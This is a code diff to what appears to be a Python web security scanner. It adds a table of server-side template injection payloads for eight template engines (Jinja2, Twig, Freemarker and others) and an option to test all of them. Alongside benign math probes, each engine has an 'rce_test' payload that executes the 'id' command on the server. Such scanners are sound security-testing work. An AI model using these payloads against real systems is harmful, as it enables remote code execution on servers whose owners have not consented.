@@ -61,14 +61,67 @@ def test_login_sqli(
     return results
 
 
+SSTI_ENGINE_PAYLOADS: dict[str, dict[str, str]] = {
+    "jinja2": {
+        "math_7x7": "{{7*7}}",
+        "math_7x49": "{{7*49}}",
+        "config": "{{config}}",
+        "self": "{{self}}",
+        "rce_test": "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+    },
+    "twig": {
+        "math_7x7": "{{7*7}}",
+        "math_7x49": "{{7*49}}",
+        "config": "{{app.request.server}}",
+        "rce_test": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
+    },
+    "freemarker": {
+        "math_7x7": "${7*7}",
+        "math_7x49": "${7*49}",
+        "rce_test": '<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}',
+    },
+    "velocity": {
+        "math_7x7": "#set($x=7*7)$x",
+        "math_7x49": "#set($x=7*49)$x",
+        "rce_test": "#set($e=$class.forName('java.lang.Runtime'))",
+    },
+    "erb": {
+        "math_7x7": "<%= 7*7 %>",
+        "math_7x49": "<%= 7*49 %>",
+        "rce_test": "<%= `id` %>",
+    },
+    "smarty": {
+        "math_7x7": "{7*7}",
+        "math_7x49": "{7*49}",
+        "rce_test": "{system('id')}",
+    },
+    "mako": {
+        "math_7x7": "${7*7}",
+        "math_7x49": "${7*49}",
+        "rce_test": "<%import os;x=os.popen('id').read()%>${x}",
+    },
+    "pebble": {
+        "math_7x7": "{{7*7}}",
+        "math_7x49": "{{7*49}}",
+        "rce_test": "{%set cmd='id'%}",
+    },
+}
+
+
 def test_ssti(
     url: str,
     method: str = "POST",
     param_name: str = "template",
     *,
     scanner: SecurityScanner | None = None,
+    test_all_engines: bool = False,
 ) -> list[dict[str, Any]]:
-    """Test an endpoint for Server-Side Template Injection."""
+    """Test an endpoint for Server-Side Template Injection.
+
+    By default tests Jinja2 payloads. If test_all_engines=True, tests
+    payloads for 8 template engines: Jinja2, Twig, Freemarker, Velocity,
+    ERB, Smarty, Mako, Pebble.
+    """
     scanner = _get_scanner(url, scanner)
 
     is_post = method.upper() in ("POST", "PUT", "PATCH")
@@ -77,12 +130,13 @@ def test_ssti(
     else:
         baseline = scanner.get_baseline(method, url, params={param_name: "test"})
 
-    payloads = {
-        "math_7x7": "{{7*7}}",
-        "math_7x49": "{{7*49}}",
-        "config": "{{config}}",
-        "self": "{{self}}",
-    }
+    if test_all_engines:
+        payloads: dict[str, str] = {}
+        for engine, engine_payloads in SSTI_ENGINE_PAYLOADS.items():
+            for name, value in engine_payloads.items():
+                payloads[f"{engine}_{name}"] = value
+    else:
+        payloads = SSTI_ENGINE_PAYLOADS["jinja2"]
 
     print(f"[*] Testing SSTI on {url}")
     print(f"[*] Baseline: status={baseline.status_code}, length={len(baseline.text)}")
